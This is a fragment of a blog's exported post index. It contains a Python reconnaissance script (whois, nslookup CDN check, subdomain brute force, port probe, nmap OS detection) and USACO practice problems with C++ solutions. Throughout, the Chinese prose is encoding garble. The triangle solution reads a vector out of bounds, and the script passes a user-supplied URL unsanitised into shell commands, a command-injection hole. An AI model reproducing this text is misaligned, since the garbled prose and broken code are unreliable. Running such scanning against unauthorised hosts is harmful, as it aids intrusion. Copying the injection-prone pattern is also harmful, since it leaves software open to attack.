ç”¨åœ¨å¾ªç¯ä¸­ï¼ŒåŸºäºæ¡ä»¶æ§åˆ¶ï¼Œç»ˆæ­¢å¾ªç¯ä½“å†…å®¹çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç»“æŸå½“å‰çš„æ•´ä¸ªå¾ªç¯</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaSE </tag>
            
            <tag> JavaåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonä¿¡æ¯æœé›†</title>
      <link href="/2022/03/28/python-xin-xi-sou-ji/"/>
      <url>/2022/03/28/python-xin-xi-sou-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>ä¸€å…±å…­ä¸ªæ¨¡å—ï¼Œå¯åœ¨cmdé€‰æ‹©è°ƒç”¨å“ªä¸ªæ¨¡å—ï¼Œå‚æ•°allæ˜¯å…¨éƒ¨è¿›è¡Œè°ƒç”¨</strong></p><p><strong>å­åŸŸåæ¨¡å—æ˜¯è‡ªå·±çš„å­—å…¸åº“ï¼Œå¼•å…¥äº†nmapç¬¬ä¸‰æ–¹åº“</strong></p><p><strong>å¯ä»¥åœ¨powershellç›´æ¥è°ƒç”¨æˆ–è€…æ·»åŠ è‡ªå·±çš„è¾“å…¥è¯­å¥</strong></p><h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os<span class="token punctuation">,</span>time<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>whois<span class="token comment">#ipæŸ¥è¯¢</span><span class="token keyword">def</span> <span class="token function">ip_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    ip<span class="token operator">=</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token comment">#whoisæŸ¥è¯¢</span><span class="token keyword">def</span> <span class="token function">whois_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> whois<span class="token punctuation">.</span>whois<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token comment">#CDNåˆ¤æ–­-åˆ©ç”¨è¿”å›IPæ¡æ•°è¿›è¡Œåˆ¤æ–­</span><span class="token keyword">def</span> <span class="token function">cdn_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    ns<span class="token operator">=</span><span class="token string">"nslookup "</span><span class="token operator">+</span>url    <span class="token comment">#data=os.system(ns)</span>    <span class="token comment">#print(data) #ç»“æœæ— æ³•è¯»å–æ“ä½œ</span>    data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>ns<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å­˜åœ¨CDN"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä¸å­˜åœ¨CDN"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token comment">#å­åŸŸåæŸ¥è¯¢-</span><span class="token comment">#1.åˆ©ç”¨å­—å…¸è®°è½½çˆ†ç ´è¿›è¡ŒæŸ¥è¯¢</span><span class="token comment">#2.åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£è¿›è¡ŒæŸ¥è¯¢</span><span class="token keyword">def</span> <span class="token function">SubDomain_list_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span>url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"www."</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> SubDomain_list <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"[è‡ªå·±çš„å­—å…¸åœ°å€]"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        SubDomain_list<span class="token operator">=</span>SubDomain_list<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>        SubDomain_list_url<span class="token operator">=</span>SubDomain_list<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>url        <span class="token keyword">try</span><span class="token punctuation">:</span>            ip<span class="token operator">=</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>SubDomain_list_url<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>SubDomain_list_url<span class="token operator">+</span><span class="token string">"-&gt;"</span><span class="token operator">+</span>ip<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">SubDomain_api_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span>url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"www."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#ç«¯å£æ‰«æ</span><span class="token keyword">def</span> <span class="token function">port_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">#ip="192.168.76.155"</span>    <span class="token comment">#ports={'21','22','135','443','445','80','1433','3306',"3389",'1521','8000','7002','7001','8080',"9090",'8089',"4848}</span>    server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token comment">#for port in ports:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data<span class="token operator">=</span>server<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"|open"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"|close"</span><span class="token punctuation">)</span>            <span class="token keyword">pass</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token comment">#ç³»ç»Ÿåˆ¤æ–­-</span><span class="token comment">#1.åŸºäºTTLå€¼è¿›è¡Œåˆ¤æ–­</span><span class="token comment">#2.åŸºäºç¬¬ä¸‰æ–¹è„šæœ¬ï¼ˆnmapï¼‰è¿›è¡Œåˆ¤æ–­</span><span class="token keyword">def</span> <span class="token function">os_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"nmap\\nmap -O "</span><span class="token operator">+</span>url<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------++++++-------------------------------------------'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Testï¼špython test.py www.dudu.com all"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    check <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> check<span class="token operator">==</span><span class="token string">"all"</span><span class="token punctuation">:</span>        ip_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        whois_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        port_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        cdn_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        os_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        SubDomain_list_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> python </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¯æ—¥ä¸€é¢˜ï¼ˆäºŒï¼‰</title>
      <link href="/2022/03/27/mei-ri-yi-ti-er/"/>
      <url>/2022/03/27/mei-ri-yi-ti-er/</url>
      
        <content type="html"><![CDATA[<p>è¿™äº›é¢˜å‡å–è‡ªäºUSACOã€‚</p><h2 id="å•è¯å¤„ç†å™¨"><a href="#å•è¯å¤„ç†å™¨" class="headerlink" title="å•è¯å¤„ç†å™¨"></a>å•è¯å¤„ç†å™¨</h2><p>å¥¶ç‰› Bessie æ­£åœ¨å®Œæˆå¥¹çš„å†™ä½œè¯¾çš„ä¸€ç¯‡ä½œæ–‡ã€‚</p><p>ç”±äºå¥¹å†™å­—å¾ˆéš¾çœ‹ï¼Œå¥¹å†³å®šç”¨ä¸€ä¸ªå•è¯å¤„ç†å™¨æ¥è¾“å…¥è¿™ç¯‡ä½œæ–‡ã€‚</p><p>è¿™ç¯‡ä½œæ–‡å…±æœ‰ $N$ ä¸ªå•è¯ï¼Œç”¨ç©ºæ ¼åˆ†éš”ã€‚</p><p>æ¯ä¸ªå•è¯çš„é•¿åº¦åœ¨ $1$ åˆ° $15$ ä¹‹é—´ï¼Œä»…ç”±å¤§å†™å’Œå°å†™å­—æ¯ç»„æˆã€‚</p><p>æ ¹æ®ä½œä¸šçš„è¦æ±‚ï¼Œè¿™ç¯‡ä½œæ–‡éœ€è¦ç”¨ä¸€ç§ç‰¹åˆ«çš„æ–¹å¼æ’ç‰ˆï¼š</p><p>æ¯ä¸€è¡ŒåŒ…å«çš„å­—ç¬¦ä¸è¶…è¿‡ $K$ ä¸ªï¼Œç©ºæ ¼ä¸è®¡ã€‚</p><p>å¹¸å¥½ Bessie çš„å•è¯å¤„ç†å™¨èƒ½å¤Ÿå¤„ç†è¿™æ ·çš„è¦æ±‚ï¼Œå®ƒä¼šæŒ‰ç…§å¦‚ä¸‹çš„æ–¹å¼ï¼š</p><ul><li>å¦‚æœ Bessie è¾“å…¥äº†ä¸€ä¸ªå•è¯ï¼Œè¿™ä¸ªå•è¯èƒ½å¤Ÿæ”¾è¿›å½“å‰è¡Œï¼Œå°±æ”¾åœ¨å½“å‰è¡Œã€‚</li><li>å¦åˆ™ï¼Œå°†è¿™ä¸ªå•è¯æ”¾åˆ°ä¸‹ä¸€è¡Œï¼Œç„¶åç»§ç»­å‘ä¸‹ä¸€è¡Œæ·»åŠ å•è¯ã€‚</li></ul><p>å½“ç„¶ï¼ŒåŒä¸€è¡Œä¸­çš„å•è¯ä¹‹é—´ä»ç„¶ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ã€‚æ¯ä¸€è¡Œçš„ç»“å°¾éƒ½ä¸åº”å½“æœ‰ç©ºæ ¼ã€‚</p><p>å¾ˆä¸å¹¸ï¼ŒBessie çš„å•è¯å¤„ç†å™¨åˆšå¥½åäº†ã€‚</p><p>è¯·å¸®åŠ©å¥¹æ­£ç¡®åœ°æ’ç‰ˆå¥¹çš„ä½œæ–‡ï¼</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªç©ºæ ¼åˆ†éš”çš„æ•´æ•° $N$ å’Œ $K$ã€‚</p><p>ä¸‹ä¸€è¡ŒåŒ…å« $N$ ä¸ªå•è¯ï¼Œå•è¯ä¹‹é—´ç”¨å•ä¸ªç©ºæ ¼åˆ†éš”ã€‚</p><p>æ‰€æœ‰å•è¯çš„é•¿åº¦éƒ½ä¸è¶…è¿‡ä¸€è¡Œä¸­çš„å­—ç¬¦ä¸Šé™æ•° $K$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºæ­£ç¡®æ’ç‰ˆçš„ Bessie çš„ä½œæ–‡ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1â‰¤Nâ‰¤100$,<br>$1â‰¤Kâ‰¤80$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">10 7hello my name is Bessie and this is my essay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">hello myname isBessieand thisis myessay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š"><a href="#æ ·ä¾‹è§£é‡Š" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>ç¬¬ä¸€è¡ŒåŒ…å« $7$ ä¸ªéç©ºæ ¼å­—ç¬¦ï¼ŒåŒ…æ‹¬ â€œhelloâ€ ä»¥åŠ â€œmyâ€ã€‚</p><p>å†åŠ å…¥ â€œnameâ€ ä¼šä½¿å¾—ç¬¬ä¸€è¡ŒåŒ…å« $11&gt;7$ ä¸ªéç©ºæ ¼å­—ç¬¦ï¼Œæ‰€ä»¥è¿™ä¸ªå•è¯ä¼šè¢«æ”¾åˆ°ä¸‹ä¸€è¡Œã€‚</p><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç®€å•çš„æ¨¡æ‹Ÿã€‚å­—ç¬¦ä¸²$b$ç±»ä¼¼äºä¸€ä¸ªè®¡æ•°å™¨ï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¸²èµ‹å€¼ç»™$b$ï¼Œ$b$çš„$size$å¤§äº$k$æ—¶å°±æ¢è¡Œï¼Œå¹¶å°†æ²¡è¢«ä¸Šä¸€è¡Œè¾“å‡ºçš„å­—ç¬¦èµ‹å€¼ç»™$b$ã€‚</p><p>å¯»æ±‚æ–¹ä¾¿èƒ½ç›´æ¥è¾“å‡ºå°±ç›´æ¥è¾“å‡ºï¼Œä¸éœ€è¦å¦å¼€å­—ç¬¦ä¸²æ•°ç»„ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstring&gt;</span></span>using namespace std<span class="token punctuation">;</span>string a<span class="token punctuation">;</span>string b<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>k<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">;</span>        b <span class="token operator">+=</span> a<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> k<span class="token punctuation">)</span><span class="token punctuation">{</span>            cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>            b <span class="token operator">=</span> a<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span>a<span class="token operator">&lt;&lt;</span><span class="token char">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰è§’å½¢"><a href="#ä¸‰è§’å½¢" class="headerlink" title="ä¸‰è§’å½¢"></a>ä¸‰è§’å½¢</h2><p>Farmer John æƒ³è¦ç»™ä»–çš„å¥¶ç‰›ä»¬å»ºé€ ä¸€ä¸ªä¸‰è§’å½¢ç‰§åœºã€‚</p><p>æœ‰ $N$ ä¸ªæ …æ æŸ±å­åˆ†åˆ«ä½äºå†œåœºçš„äºŒç»´å¹³é¢ä¸Šä¸åŒçš„ç‚¹ $(X_1,Y_1)â€¦(X_N,Y_N)$ã€‚</p><p>ä»–å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸‰ä¸ªç‚¹ç»„æˆä¸‰è§’å½¢ç‰§åœºï¼Œåªè¦ä¸‰è§’å½¢æœ‰ä¸€æ¡è¾¹ä¸ $x$ è½´å¹³è¡Œï¼Œä¸”æœ‰å¦ä¸€æ¡è¾¹ä¸ $y$ è½´å¹³è¡Œã€‚</p><p>Farmer John å¯ä»¥å›´æˆçš„ç‰§åœºçš„æœ€å¤§é¢ç§¯æ˜¯å¤šå°‘ï¼Ÿ</p><p>ä¿è¯å­˜åœ¨è‡³å°‘ä¸€ä¸ªåˆæ³•çš„ä¸‰è§’å½¢ç‰§åœºã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° $N$ã€‚</p><p>ä»¥ä¸‹ $N$ è¡Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° $X_i$ å’Œ $Y_i$ï¼Œå‡åœ¨èŒƒå›´ $âˆ’10^4â€¦10^4$ ä¹‹å†…ï¼Œæè¿°ä¸€ä¸ªæ …æ æŸ±å­çš„ä½ç½®ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>ç”±äºé¢ç§¯ä¸ä¸€å®šä¸ºæ•´æ•°ï¼Œè¾“å‡ºæ …æ æŸ±å­å¯ä»¥å›´æˆçš„åˆæ³•ä¸‰è§’å½¢çš„æœ€å¤§é¢ç§¯çš„<strong>ä¸¤å€</strong>ã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$3 \le N \le 100$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">40 00 11 01 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-1"><a href="#æ ·ä¾‹è§£é‡Š-1" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>ä½äºç‚¹ $(0,0)ã€(1,0)$ å’Œ $(1,2)$ çš„æœ¨æ¡©ç»„æˆäº†ä¸€ä¸ªé¢ç§¯ä¸º $1$ çš„ä¸‰è§’å½¢ã€‚æ‰€ä»¥ï¼Œç­”æ¡ˆä¸º $2â‹…1=2$ã€‚</p><p>åªæœ‰ä¸€ä¸ªå…¶ä»–çš„ä¸‰è§’å½¢ï¼Œé¢ç§¯ä¸º $0.5$ã€‚</p><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç®€å•æ¨¡æ‹Ÿï¼Œä¸‰é‡å¾ªç¯æ‰¾åˆ°æœ€é•¿è¾¹ï¼Œç›´æ¥åº•$Ã—$é«˜ã€‚</p><p>å¯ä»¥ç”¨æ•°ç»„å­˜ï¼Œç”¨vetcorä¸ºäº†å¤ä¹ ä¸€ä¸‹vectorçš„è¯­æ³•ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath&gt;</span></span>using namespace std<span class="token punctuation">;</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span>a<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   cin<span class="token operator">&gt;&gt;</span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">int</span> c<span class="token punctuation">,</span>d<span class="token punctuation">;</span>    cin<span class="token operator">&gt;&gt;</span>c<span class="token operator">&gt;&gt;</span>d<span class="token punctuation">;</span>    a<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j <span class="token operator">||</span> i <span class="token operator">==</span> k <span class="token operator">||</span> j <span class="token operator">==</span> k<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token comment">//ç›¸åŒçš„ç‚¹ç›´æ¥continue</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">==</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">==</span> a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">-</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">-</span> a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 